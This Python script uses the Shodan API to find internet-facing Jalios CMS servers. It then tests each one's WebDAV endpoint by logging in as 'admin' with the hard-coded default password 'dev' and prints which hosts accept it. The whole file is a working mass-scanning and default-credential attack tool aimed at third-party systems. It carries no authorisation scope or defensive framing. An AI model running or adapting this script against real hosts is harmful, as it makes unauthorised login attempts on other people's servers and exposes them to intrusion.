from shodan import Shodan
import six
import requests
from requests.auth import HTTPBasicAuth
import socket

def check_vulnerable(url):
	http_user = "admin"
	http_pass1 = "wrong_password"
	http_pass2 = "dev"
	try:
		req1 = requests.get(url, auth=HTTPBasicAuth(http_user, http_pass1), verify=False, timeout=5)
		req2 = requests.get(url, auth=HTTPBasicAuth(http_user, http_pass2), verify=False, timeout=5)
		if req1.status_code == 401 and req2.status_code == 200:
			return True
		else:
			return False
	except:
		return False

def hostname_resolves(hostname):
    try:
        socket.gethostbyname(hostname)
        return 1
    except socket.error:
        return 0


def search_shodan(api):
	results = api.search('http.component:"jalios"')
	print('Results found: {}'.format(results['total']))
	for result in results['matches']:
		ip_addr = result['ip_str']
		if len(result['hostnames']) >= 1:
			hostname = result['hostnames'][0]
		else:
			hostname = " "
		is_vulnerable = False
		if check_vulnerable("http://"+ip_addr+"/webdav"):
			is_vulnerable = True
		elif check_vulnerable("https://"+ip_addr+"/webdav"):
			is_vulnerable = True
		elif not is_vulnerable and hostname != "" and hostname_resolves(hostname):
			if check_vulnerable("http://"+hostname+"/webdav"):
					is_vulnerable = True
			elif check_vulnerable("https://"+hostname+"/webdav"):
					is_vulnerable = True
		else:
			is_vulnerable = False

		print('IP: %s   \tVulnerable: %s    \tHostname: %s    ' % (ip_addr, is_vulnerable, hostname) )

def main():
	api_key = six.moves.input("Enter Shodan API key: ")
	api = Shodan(api_key)
	search_shodan(api)

main()
